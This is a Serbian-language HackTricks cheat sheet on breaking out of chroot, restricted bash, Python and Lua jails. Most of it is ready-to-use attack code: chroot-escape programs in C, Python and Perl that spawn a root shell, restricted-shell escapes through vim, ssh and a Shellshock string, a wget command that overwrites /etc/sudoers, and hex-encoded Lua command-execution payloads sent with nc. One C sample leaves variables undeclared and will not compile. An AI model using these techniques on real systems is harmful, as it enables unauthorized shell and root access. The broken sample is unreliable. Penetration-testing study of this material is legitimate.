# Bekstvo iz zatvora

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **GTFOBins**

**Pretražite na** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **da li možete izvršiti bilo koji binarni fajl sa "Shell" svojstvom**

## Bekstva iz Chroot-a

Sa [vikija](https://en.wikipedia.org/wiki/Chroot#Limitations): Mehanizam chroot-a **nije namenjen** za odbranu od namernog menjanja od strane **privilegovanih** (**root**) **korisnika**. Na većini sistema, chroot konteksti se ne stapaju pravilno i programi u chroot-u **sa dovoljnim privilegijama mogu izvršiti drugi chroot da izađu**.\
Obično to znači da da biste pobegli morate biti root unutar chroot-a.

{% hint style="success" %}
**Alat** [**chw00t**](https://github.com/earthquake/chw00t) je napravljen da zloupotrebi sledeće scenarije i pobegne iz `chroot`-a.
{% endhint %}

### Root + Trenutni radni direktorijum

{% hint style="warning" %}
Ako ste **root** unutar chroot-a možete pobeci kreiranjem **još jednog chroot-a**. To je zato što 2 chroot-a ne mogu koegzistirati (u Linux-u), pa ako kreirate folder i zatim **napravite novi chroot** na tom novom folderu **bivajući izvan njega**, sada ćete biti **izvan novog chroot-a** i stoga ćete biti u FS-u.

Ovo se dešava jer obično chroot NE POMERA vaš trenutni radni direktorijum na naznačeni, tako da možete kreirati chroot ali biti izvan njega.
{% endhint %}

Obično nećete pronaći binarni fajl `chroot` unutar chroot zatvora, ali **možete kompajlirati, otpremiti i izvršiti** binarni fajl:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Sačuvan fd

{% hint style="warning" %}
Ovo je slično prethodnom slučaju, ali u ovom slučaju **napadač čuva file deskriptor trenutnog direktorijuma** i zatim **kreira chroot u novom folderu**. Na kraju, pošto ima **pristup** tom **FD** **izvan** chroot-a, pristupa mu i **izlazi**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD može biti prosleđen preko Unix Domain Sockets, tako da:

* Kreirajte child proces (fork)
* Kreirajte UDS tako da roditelj i dete mogu komunicirati
* Pokrenite chroot u child procesu u drugom folderu
* U roditeljskom procesu, kreirajte FD foldera koji je van novog chroot-a novog child procesa
* Prosledite tom FD detetu koristeći UDS
* Dete promeni direktorijum na taj FD, i zbog toga što je van svog chroot-a, pobegne iz zatvora
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Montiranje root uređaja (/) u direktorijum unutar chroot-a
* Chrootovanje u taj direktorijum

Ovo je moguće u Linux-u
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Montirajte procfs u direktorijum unutar chroot-a (ako već nije)
* Potražite pid koji ima drugačiji root/cwd unos, kao što je: /proc/1/root
* Chrootujte se u taj unos
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Kreirajte Fork (child proc) i chrootujte se u drugi folder dublje u FS i promenite direktorijum na njega
* Iz roditeljskog procesa, premestite folder gde je child proces u folder pre chroot-a dece
* Ovaj dečiji proces će se naći van chroot-a
{% endhint %}

### ptrace

{% hint style="warning" %}
* Ranije su korisnici mogli da debaguju svoje procese iz procesa samog sebe... ali ovo više nije moguće podrazumevano
* U svakom slučaju, ako je moguće, možete ptrace-ovati proces i izvršiti shellcode unutar njega ([vidi ovaj primer](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Zatvori

### Enumeracija

Dobijanje informacija o zatvoru:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Izmena PATH

Proverite da li možete da izmenite PATH env promenljivu
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Korišćenje vim-a
```bash
:set shell=/bin/sh
:shell
```
### Napravite skriptu

Proverite da li možete napraviti izvršnu datoteku sa _/bin/bash_ kao sadržajem
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Dobijanje bash-a putem SSH-a

Ako pristupate putem ssh-a, možete koristiti ovu prevaru da biste izvršili bash shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Deklaracija
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Možete prepisati na primer sudoers fajl
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Ostale trikove

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**Takođe može biti interesantna stranica:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Zatvori

Trikovi o bekstvu iz python zatvora na sledećoj stranici:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Zatvori

Na ovoj stranici možete pronaći globalne funkcije do kojih imate pristup unutar lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval sa izvršenjem komande:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Neke trikove **za pozivanje funkcija biblioteke bez korišćenja tačaka**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Nabrajanje funkcija biblioteke:
```bash
for k,v in pairs(string) do print(k,v) end
```
Napomena da svaki put kada izvršite prethodni jednolinijski niz u **različitom lua okruženju redosled funkcija se menja**. Stoga, ako treba da izvršite određenu funkciju, možete izvršiti napad grubom silom učitavanjem različitih lua okruženja i pozivanjem prve funkcije biblioteke.
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Dobijanje interaktivne lua ljuske**: Ako se nalazite unutar ograničene lua ljuske, možete dobiti novu lua ljusku (i nadamo se neograničenu) pozivom:
```bash
debug.debug()
```
## Reference

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slajdovi: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
